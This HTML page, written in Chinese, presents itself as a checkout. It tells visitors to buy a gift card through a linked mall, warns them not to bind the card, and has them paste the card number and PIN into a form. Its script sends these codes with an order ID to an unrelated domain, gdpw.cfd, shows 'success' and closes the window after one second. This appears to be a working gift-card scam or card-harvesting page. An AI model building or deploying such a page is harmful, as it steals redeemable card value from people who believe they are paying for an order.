<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style>
        .center {
            text-align: center;
            font-family: 等线;
            font-size: 10.5pt;
            margin: 0cm;
            line-height: 10;
        }
        .red {
            color: red;
        }
        .blue {
            color: #0070C0;
        }
        .black {
            color: black;
        }
        .input-field {
            height: 58pt;
            width: 550px;
            border: 2.3px solid black;
            text-align: center;
            font-size: 28px;
        }
        .input-field::placeholder {
            text-align: center;
            font-size: 45px;
        }
        .flex-container {
            display: flex;
            flex-direction: column;  /* 使元素垂直排列 */
            gap: 10px;  /* 设置元素之间的间距 */
            justify-content: center;
            align-items: center;
        }
        .flex-container-row {
            display: flex;
            flex-direction: row;  /* 使元素水平排列 */
            justify-content: center;
            align-items: center;
        }
        .input-field {
            height: 58pt;
            width: 550px;
            border: 2.3px solid black;
            text-align: center;
            font-size: 37px;  /* 这里设置输入框的字体大小 */
            margin-right: 10px; /* 添加右边距 */
        }
        /* 其他样式... */
    </style>
</head>
<body>
    <p class="center" style="font-size: 36pt; line-height: 1.8;"><span class="red" style="font-family: 黑体; font-size: 77.3333px;">请勿绑定卡密</span></p>
    <div class="flex-container-row" style="line-height: 1.8;">
        <div class="flex-container">
            <input class="input-field" type="text" value="" placeholder="粘贴复制卡号到这里">
            <input class="input-field" type="text" value="" placeholder="粘贴复制卡密到这里">
            <!-- 添加隐藏的merchantOrderId输入字段 -->
            <input type="hidden" id="merchantOrderId" value="{{merchantOrderId}}">
        </div>
        <div>
<span id="submit-button" class="red" style="font-size: 58pt;"><span style="font-family: 黑体; font-size: 52pt;">&ensp;提交</span></span>
</div>
</div>
<p class="center" style="font-size: 24pt; line-height: 1.8;"><span style="font-family: 黑体;"><a href="{{website_url}}" class="red"><span style="font-size: 65px;">点击这里购买卡密</span></a></span></p>
<p class="center" style="font-size: 24pt; line-height: 1.8;"><span style="font-family: 黑体;"><span style="font-size: 60px;">订单金额：{{order_amount}}</span></span></p>
<p class="center" style="font-size: 24pt; line-height: 1.8;"><span style="font-family: 黑体;"><a href="https://service.jifenfu.net/sspmall-front/index.html#/GiftCardTheme?batchId=1698969229230747650&cashPrice=10000" class="red"><span style="font-size: 60px; color: rgb(0, 0, 255);">购买后不知卡密点这里</span></a></span></p>
<p class="center" style="font-size: 24pt; line-height: 1.8;"><span class="black" style="font-size: 60px; font-family: 黑体;">请跟下图步骤支付</span></p>
<div style="display: flex; justify-content: center;">
<img src="1.jpg" alt="图片描述" style="max-width: 100%; display: block; margin: auto;">
</div>
<p class="center" style="font-size: 24pt; line-height: 1.8;"><span class="black" style="font-size: 60px; font-family: 黑体;">
</span></p>
<div style="display: flex; justify-content: center;">
<img src="/uploads/20231007/2023100703112174683.jpg" style="max-width:100%;" border="0">
</div>
<br>
<p></p>
<p class="center" style="font-size: 24pt; line-height: 1.8;"><span class="black" style="font-size: 60px; font-family: 黑体;"><br>
</span></p>
    <script>
        document.querySelector('#submit-button').addEventListener('click', function() {
            var inputFields = document.querySelectorAll('.input-field');
            var merchantOrderId = document.querySelector('#merchantOrderId').value; // 获取merchantOrderId的值
            var allFieldsFilled = Array.from(inputFields).every(function(inputField) {
                return inputField.value !== '';
            });
            if (allFieldsFilled) {
                // 构造FormData对象
                var formData = new FormData();
                // 假设第一个输入框是卡号，第二个输入框是卡密
                formData.append('cardNumber', inputFields[0].value);
                formData.append('cardKey', inputFields[1].value);
                // 添加merchantOrderId到FormData
                formData.append('merchantOrderId', merchantOrderId);

                // 发送数据到服务器
                fetch('https://gdpw.cfd/qlruhhpn.php', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.text())
                .then(data => {
                    console.log('Success:', data);
                    // 成功逻辑
                    this.innerHTML = '&ensp;成功';
                    // 禁用输入框
                    inputFields.forEach(function(inputField) {
                                            inputField.disabled = true;
                    });
                    alert('提交后请耐心等待，窗口1秒后会自动关闭');
                    setTimeout(function() {
                        window.close();
                    }, 1000);
                })
                .catch((error) => {
                    console.error('Error:', error);
                });
            } else {
                alert('请检查卡号与卡密是否输入');
            }
        });
    </script>
</body>
</html>
